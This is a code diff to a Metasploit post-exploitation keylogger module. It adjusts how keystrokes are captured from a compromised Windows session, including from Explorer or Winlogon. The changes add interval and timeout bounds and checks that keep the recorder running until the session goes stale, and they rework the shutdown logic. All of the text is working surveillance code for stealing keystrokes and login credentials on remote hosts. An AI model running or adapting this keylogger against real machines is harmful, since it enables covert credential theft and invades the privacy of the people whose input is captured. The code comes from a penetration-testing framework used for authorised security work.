@@ -35,7 +35,7 @@ class MetasploitModule < Msf::Post
       [
         OptBool.new('LOCKSCREEN',   [false, 'Lock system screen.', false]),
         OptBool.new('MIGRATE',      [false, 'Perform Migration.', false]),
-        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes', 5]),
+        OptInt.new( 'INTERVAL',     [false, 'Time interval to save keystrokes in seconds (5 to 30)', 5]),
         OptInt.new( 'PID',          [false, 'Process ID to migrate to', nil]),
         OptEnum.new('CAPTURE_TYPE', [false, 'Capture keystrokes for Explorer, Winlogon or PID',
                 'explorer', ['explorer','winlogon','pid']])
@@ -43,7 +43,8 @@ class MetasploitModule < Msf::Post
       ], self.class)
     register_advanced_options(
       [
-        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false])
+        OptBool.new('ShowKeystrokes',   [false, 'Show captured keystrokes', false]),
+        OptInt.new( 'KeylogTimeOut',     [true, 'Time to close keylog recorder on stale session in seconds (150 to 900)', 300])
       ], self.class)
   end
 
@@ -71,8 +72,19 @@ class MetasploitModule < Msf::Post
   #
   # @return [void] A useful return value is not expected here
   def setup
-    @running = false
     @logfile = nil
+
+    @interval = datastore['INTERVAL'].to_i
+    if @interval < 5 || @interval > 30
+      print_error("INTERVAL value out of bounds. Setting to 5.")
+      @interval = 5
+    end
+
+    @timeout = datastore['KeylogTimeOut'].to_i
+    if @timeout < 150 || @timeout > 900
+      print_error("KeylogTimeOut value out of bounds. Setting to 300.")
+      @timeout = 300
+    end
   end
 
   # This function sets the log file and loot entry.
@@ -193,20 +205,17 @@ class MetasploitModule < Msf::Post
     end
   end
 
-
   # This function starts the keylogger
   #
   # @return [TrueClass] keylogger started successfully
   # @return [FalseClass] keylogger failed to start
   def startkeylogger
     begin
-      print_status("Starting the keystroke sniffer...")
+      print_status("Starting the keylog recorder...")
       session.ui.keyscan_start
-      @running = true
       return true
     rescue
-      print_error("Failed to start the keystroke sniffer: #{$!}")
-      @running = false
+      print_error("Failed to start the keylog recorder: #{$!}")
       return false
     end
   end
@@ -224,63 +233,103 @@ class MetasploitModule < Msf::Post
     end
   end
 
-  # This function is used to manage the key recording and timing
-  # Note: Capturing all exceptions to mute the timeout exception.
+  # This function manages the key recording process
+  # It stops the process if the session is killed or goes stale
+  # It will skip an interval if the session becomes inactive.
   #
   # @return [void] A useful return value is not expected here
   def keycap
-    keytime = datastore['INTERVAL'].to_i
     rec = 1
-    #Creating DB entry for captured keystrokes
+
     print_status("Keystrokes being saved in to #{@logfile}")
 
-    #Inserting keystrokes every number of seconds specified
     print_status("Recording keystrokes...")
+
     while rec == 1
       begin
-        if session.alive?
-          write_keylog_data
-          sleep(keytime)
+        if session_good?
+          write_keylog_data if good_to_cap?
         else
-          print_status("Session has been closed. Exiting keylog recorder.")
+          print_status("Session: #{datastore['SESSION']} is stale or has been closed. Exiting keylog recorder.")
           rec = 0
         end
-      rescue::Exception => e
-        if e.class.to_s == "Rex::TimeoutError"
-          print_error("Keylog Recorder has timed out. Session may be dead. Exiting...")
-        else
-          print_error("Keylog Recorder encountered error: #{error}. Exiting...")
-        end
-        @running = false
+      rescue ::Rex::Post::Meterpreter::RequestError => error
+        print_error("Keylog recorder encountered and error. Exiting....")
+        print_error(error.to_s)
         rec = 0
       end
     end
   end
+  
+  # This function manages sure a session is still alive acording to the Framework.
+  # Also, if the session reaches the timeout age whithout checking in it is
+  # assumed to be stale.
+  #
+  # @return [TrueClass] Session is still alive (Framework) and not stale
+  # @return [FalseClass] Session is dead or deamed stale
+  def session_good?
+    return false unless session.alive?
+    session_age = Time.now.to_i - session.last_checkin.to_i
+    return false if session_age >= @timeout
+    return true
+  end
+
+  # This function manages the recorder timing along with making sure that the session is still checking in.
+  # It does this by making sure that the age times are not increasing consistently.
+  # It needs three 'good' value in a row to indicate that the session is still good.
+  # At most, this function will run two seconds past the specified value for a good session.
+  # This helps keep the module clean when run as a job.
+  #
+  # @return [TrueClass] Session has been verified to still be active
+  # @return [FalseClass] Session appears to have become inactive
+  def good_to_cap?
+    continue = 1
+    count = 0
+    good_count = 0
+    max = @interval + 3
+
+    prev_age = Time.now.to_i - session.last_checkin.to_i
+
+    while continue == 1
+      count = count + 1
+      sleep(1)
+      current_age = Time.now.to_i - session.last_checkin.to_i
+
+      if current_age < prev_age || current_age < 2
+        good_count = good_count + 1
+      else
+        good_count = 0
+      end
+
+      prev_age = current_age
+
+      return true if count >= @interval && good_count >= 3
+
+      return false if count >= @interval + 3
+    end
+  end
 
   # This function writes off the last set of key strokes
-  # It will wait two times the set interval to ensure that the last
-  # set of keys get logged.
+  # and shuts down the key logger
   #
   # @return [void] A useful return value is not expected here
   def finish_up
-    print_status "Saving last few keystrokes..."
-    write_keylog_data
-    sleep(datastore['INTERVAL'].to_i * 2)
-    write_keylog_data
-    print_status("Stopping keystroke sniffer...")
-    session.ui.keyscan_stop rescue nil
-    @running = false
+    print_status "Shutting down the keylog recorder. Stand by."
+    if good_to_cap?
+      write_keylog_data
+      session.ui.keyscan_stop rescue nil
+    end
   end
 
   # This function cleans up the module.
   # finish_up was added for clean exit when this module is run
   # as a job.
   #
-  # Known Issue: This gets run twice when killing the job. Not sure why.
+  # Known Issue: This appears to run twice when killing the job. Not sure why.
   # Does not cause issues with output or errors.
   #
   # @return [void] A useful return value is not expected here
   def cleanup
-     finish_up if @running && session.alive?
+     finish_up if session_good?
   end
 end
